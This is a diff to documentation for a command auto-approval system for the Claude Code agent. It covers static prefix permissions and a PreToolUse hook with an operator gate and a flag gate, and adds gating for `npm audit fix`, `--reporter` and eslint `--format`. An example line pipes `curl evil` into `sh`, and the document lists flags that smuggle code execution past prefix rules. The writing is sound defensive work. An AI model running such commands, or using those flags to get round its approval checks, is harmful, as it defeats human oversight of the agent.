@@ -47,14 +47,17 @@ whose danger lives in a *flag* is handled by the hook, which can inspect flags.
 1. **Static `permissions.allow`** — Claude Code's native fast-path. Restricted to
    commands that cannot be weaponized by an argument: `npm ci`/`install`/`run`/
    `test` (build/test — they run the project's own trusted package scripts),
-   `npm ls`/`audit` (pure reads), and `git status`/`rev-parse` (pure reads).
+   `npm ls` (a pure read), and `git status`/`rev-parse` (pure reads).
    Prefix rules (`Bash(npm ci:*)`) match the command and its arguments. Notably
    ABSENT, and intentionally so: `git diff`/`log`/`show` and `cargo check` (their
-   `--output`/`--ext-diff`/`-x`/`--config` flags write files or run programs) and
-   the `npx` JS tools (`vitest`/`eslint`/`tsc`/`playwright` — `--config` loads a
-   config file that is itself executable code). Those are safe in their everyday
-   form but flag-sensitive, so they live in the flag-aware hook instead — never on
-   the blunt fast-path. This keeps the static list safe regardless of how the hook
+   `--output`/`--ext-diff`/`-x`/`--config` flags write files or run programs), the
+   `npx` JS tools (`vitest`/`eslint`/`tsc`/`playwright` — `--config`/`--reporter`/
+   `--format`/`-f` load a file that is itself executable code), and `npm audit`
+   (bare `npm audit` is a read, but a prefix rule is subcommand-blind and would
+   auto-approve `npm audit fix`, which runs `npm install` lifecycle scripts and
+   rewrites the lockfile). Those are safe in their everyday form but flag- or
+   subcommand-sensitive, so they live in the flag-aware hook instead — never on the
+   blunt fast-path. This keeps the static list safe regardless of how the hook
    behaves.
 
 2. **`auto-approve-safe-commands.sh`** (a `PreToolUse` hook, matcher `Bash`) — the
@@ -63,17 +66,22 @@ whose danger lives in a *flag* is handled by the hook, which can inspect flags.
    vitest`/`eslint`/`tsc`/`playwright`) **in their safe form**, plus commands the
    static list never enumerates (`npx @axe-core/cli`, `npx @axe-core/reporter`,
    `npx skills`, `git worktree list`/`shortlog`/`describe`/`ls-files`/`stash list`/
-   `remote -v`, `npm outdated`/`view`/`explain`/`why`/`pkg get`/`cache clean`). It
+   `remote -v`, `npm outdated`/`view`/`explain`/`why`/`pkg get`/`cache clean`,
+   `npm audit` and `npm audit --<flag>` — but NOT `npm audit fix`). It
    emits an `allow` decision for a known-safe SINGLE command, `ask` for everything
    else, and ALWAYS exits 0 — it never hard-blocks. Two gates fire BEFORE the
    allow-list is consulted:
    - **Operator gate** — refuses any compound, piped, redirected, substituted,
      variable-expanded, or multi-line command even when the leading token is safe
      (`npm ci && curl evil | sh` prefix-matches `npm ci`).
-   - **Flag gate** — refuses any command carrying a program-execution or
-     file-write flag (`--config`, `--output`, `--ext-diff`/`--extcmd`/`-x`,
-     `--exec`/`--upload-pack`/`--receive-pack`). These need no shell operator, so
-     the operator gate never sees them — the flag itself is the payload.
+   - **Flag gate** — refuses any command carrying a program-execution, file-write,
+     or module-loading flag (`--config`, `--output`, `--ext-diff`/`--extcmd`/`-x`,
+     `--exec`/`--upload-pack`/`--receive-pack`, and `--reporter` — vitest/playwright
+     `import()` a reporter module). eslint's `--format`/`-f` load a formatter module
+     the same way and are gated WITHIN `npx` only: `git log --format=...` is a benign
+     pretty-print string and `npm install -f` means `--force`, so a global gate
+     would wrongly defer those. These need no shell operator, so the operator gate
+     never sees them — the flag itself is the payload.
 
    Its allow-list and exact allow/ask/defer contract are pinned by
    `.claude/hooks/__tests__/auto-approve-safe-commands.test.sh`.
@@ -82,7 +90,9 @@ Deliberately NOT auto-approved by either layer (they defer to a prompt):
 `git branch`/`git tag` (their flag forms mutate refs — `git branch -D`, `git tag
 -d/-f`, bare `git tag <name>` creates a tag — and a prefix gate cannot tell the
 read form from the write form), `npm pkg set`/`delete`/`fix` (mutate the tracked
-`package.json`; only `npm pkg get` is auto-approved), `npm exec` (runs arbitrary
+`package.json`; only `npm pkg get` is auto-approved), `npm audit fix` (runs
+`npm install` lifecycle scripts and rewrites the lockfile; only the read forms
+`npm audit` / `npm audit --<flag>` are auto-approved), `npm exec` (runs arbitrary
 package binaries), and `npx drizzle-kit` (`drop`/`push` are DB-destructive,
 `generate` writes migration files).
 
